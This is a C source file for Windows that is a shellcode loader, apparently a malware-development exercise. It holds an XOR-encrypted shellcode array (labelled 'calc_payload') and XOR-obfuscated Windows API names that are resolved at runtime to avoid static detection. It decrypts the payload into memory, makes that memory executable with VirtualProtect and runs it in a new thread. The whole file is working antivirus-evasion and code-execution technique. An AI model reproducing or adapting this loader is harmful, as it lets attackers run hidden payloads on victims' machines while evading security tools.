#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Calls
typedef BOOL(WINAPI* pCloseHandle)(HANDLE hObject);
typedef DWORD(WINAPI* pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
typedef VOID(WINAPI* pRtlMoveMemory)(VOID UNALIGNED* Destination, const VOID UNALIGNED* Source, SIZE_T Length);
typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL(WINAPI* pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef HANDLE(WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE  lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD  lpThreadId);

// Shellcode
unsigned char s_pay[] = { 0xac, 0x8, 0xf0, 0x97, 0x87, 0xd8, 0xb2, 0x64, 0x50, 0x40, 0x32, 0x22, 0x36, 0x60, 0x20, 0x35, 0x6, 0x8, 0x42, 0xa1, 0x12, 0x78, 0xf9, 0x36, 0x30, 0x8, 0xf8, 0x21, 0x6f, 0x78, 0xf9, 0x36, 0x70, 0x8, 0xf8, 0x1, 0x27, 0x78, 0x7d, 0xd3, 0x1a, 0xa, 0x3e, 0x42, 0xbe, 0x78, 0x43, 0xa4, 0xfc, 0x7c, 0x12, 0xf, 0x75, 0x1c, 0x52, 0x25, 0x91, 0x89, 0x7e, 0x32, 0x76, 0xf1, 0x90, 0x89, 0x2, 0x1, 0x22, 0x3b, 0xfc, 0x62, 0x52, 0xef, 0x12, 0x7c, 0x3b, 0x72, 0xa7, 0xbb, 0xf2, 0xec, 0x50, 0x40, 0x73, 0x3b, 0xf2, 0xf0, 0x6, 0x3, 0x18, 0x41, 0xa3, 0x23, 0xfc, 0x78, 0x6a, 0x20, 0xdb, 0x0, 0x53, 0x3a, 0x76, 0xe0, 0x91, 0x32, 0x18, 0xbf, 0xba, 0x32, 0xfc, 0x4, 0xfa, 0x2c, 0x51, 0x96, 0x3e, 0x42, 0xbe, 0x78, 0x43, 0xa4, 0xfc, 0x1, 0xb2, 0xba, 0x7a, 0x71, 0x73, 0xa5, 0x68, 0xa0, 0x6, 0x82, 0x3b, 0x33, 0x3e, 0x40, 0x58, 0x5, 0x4a, 0xa2, 0x2, 0xe8, 0x2a, 0x20, 0xdb, 0x0, 0x57, 0x3a, 0x76, 0xe0, 0x14, 0x25, 0xdb, 0x4c, 0x3b, 0x37, 0xfc, 0x70, 0x6e, 0x2d, 0x51, 0x90, 0x32, 0xf8, 0x73, 0xb8, 0x3a, 0x65, 0x80, 0x1, 0x2b, 0x32, 0x2f, 0x6e, 0x2b, 0x3e, 0x11, 0x18, 0x32, 0x2a, 0x36, 0x6a, 0x3a, 0xe7, 0xbc, 0x60, 0x32, 0x21, 0x88, 0xd0, 0x2a, 0x25, 0x9, 0x1a, 0x3b, 0xf8, 0x65, 0xd9, 0x25, 0x9b, 0xaf, 0xbf, 0x2e, 0x3b, 0xcd, 0x31, 0x72, 0x64, 0x50, 0x40, 0x73, 0x73, 0x77, 0x78, 0xff, 0xe9, 0x51, 0x41, 0x73, 0x73, 0x36, 0x8a, 0x43, 0xef, 0x3f, 0xc7, 0x8c, 0xa6, 0xcc, 0xc0, 0xc7, 0xc6, 0x6, 0x1, 0xc9, 0xd5, 0xe2, 0x8d, 0xef, 0x9b, 0x85, 0x8, 0xf0, 0xb7, 0x5f, 0xc, 0x74, 0x18, 0x5a, 0xc0, 0x88, 0x93, 0x2, 0x35, 0xc9, 0x23, 0x43, 0x32, 0x1c, 0x19, 0x77, 0x69, 0x33, 0xed, 0x8a, 0xbf, 0xa6, 0x10, 0x16, 0x5c, 0x11, 0x4a, 0x35, 0x38, 0x16, 0x73 };
unsigned int s_len = sizeof(s_pay);

// Key
char x_key[] = "P@ssw0rd";

// X0R function
void fX0R(char* data, size_t data_len, char* key, size_t key_len) {
    int j;

    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

// Exec
int main(void) {

    BOOL rv;
    HANDLE th;
    void* exec_mem;
    DWORD oldprotect = 0;

    //Function names encrypted
    unsigned char sCloseHandle[] = { 0x13, 0x2c, 0x1c, 0x0, 0x12, 0x78, 0x13, 0xa, 0x34, 0x2c, 0x16, 0x73 };
    unsigned char sRtlMoveMemory[] = { 0x2, 0x34, 0x1f, 0x3e, 0x18, 0x46, 0x17, 0x29, 0x35, 0x2d, 0x1c, 0x1, 0xe, 0x30 };
    unsigned char sVirtualAlloc[] = { 0x6, 0x29, 0x1, 0x7, 0x2, 0x51, 0x1e, 0x25, 0x3c, 0x2c, 0x1c, 0x10, 0x77 };
    unsigned char sVirtualProtect[] = { 0x6, 0x29, 0x1, 0x7, 0x2, 0x51, 0x1e, 0x34, 0x22, 0x2f, 0x7, 0x16, 0x14, 0x44, 0x72 };
    unsigned char sCreateThread[] = { 0x13, 0x32, 0x16, 0x12, 0x3, 0x55, 0x26, 0xc, 0x22, 0x25, 0x12, 0x17, 0x77 };
    unsigned char sWaitForSingleObject[] = { 0x7, 0x21, 0x1a, 0x7, 0x31, 0x5f, 0x0, 0x37, 0x39, 0x2e, 0x14, 0x1f, 0x12, 0x7f, 0x10, 0xe, 0x35, 0x23, 0x7, 0x73 };

    // Decrypt WinFunc
    fX0R((char*)sCloseHandle, sizeof(sCloseHandle), x_key, sizeof(x_key));
    fX0R((char*)sRtlMoveMemory, sizeof(sRtlMoveMemory), x_key, sizeof(x_key));
    fX0R((char*)sVirtualAlloc, sizeof(sVirtualAlloc), x_key, sizeof(x_key));
    fX0R((char*)sVirtualProtect, sizeof(sVirtualProtect), x_key, sizeof(x_key));
    fX0R((char*)sCreateThread, sizeof(sCreateThread), x_key, sizeof(x_key));
    fX0R((char*)sWaitForSingleObject, sizeof(sWaitForSingleObject), x_key, sizeof(x_key));

    // Calls
    pCloseHandle fnCloseHandle = (pCloseHandle)GetProcAddress(GetModuleHandle(L"kernel32.dll"), (LPCSTR)sCloseHandle);
    pRtlMoveMemory fnRtlMoveMemory = (pRtlMoveMemory)GetProcAddress(GetModuleHandle(L"kernel32.dll"), (LPCSTR)sRtlMoveMemory);
    pVirtualAlloc fnVirtualAlloc = (pVirtualAlloc)GetProcAddress(GetModuleHandle(L"kernel32.dll"), (LPCSTR)sVirtualAlloc);
    pVirtualProtect fnVirtualProtect = (pVirtualProtect)GetProcAddress(GetModuleHandle(L"kernel32.dll"), (LPCSTR)sVirtualProtect);
    pCreateThread fnCreateThread = (pCreateThread)GetProcAddress(GetModuleHandle(L"kernel32.dll"), (LPCSTR)sCreateThread);
    pWaitForSingleObject fnWaitForSingleObject = (pWaitForSingleObject)GetProcAddress(GetModuleHandle(L"kernel32.dll"), (LPCSTR)sWaitForSingleObject);

    // Allocate new memory buffer for payload
    exec_mem = fnVirtualAlloc(0, s_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("%-20s : 0x%-016p\n", "calc_payload addr", (void*)s_pay);
    printf("%-20s : 0x%-016p\n", "exec_mem addr", (void*)exec_mem);

    printf("\nHit me 1st!\n");
    getchar();

    // Decrypt (fX0R) s_pay
    fX0R((char*)s_pay, s_len, x_key, sizeof(x_key));

    // Copy payload to memory
    fnRtlMoveMemory(exec_mem, s_pay, s_len);

    // Make the buffer executable
    rv = fnVirtualProtect(exec_mem, s_len, PAGE_EXECUTE_READ, &oldprotect);

    printf("\nHit me 2nd!\n");
    getchar();

    // If all good, execute!
    if (rv != 0) {
        th = fnCreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
        fnWaitForSingleObject(th, -1);
    }

    return 0;
}
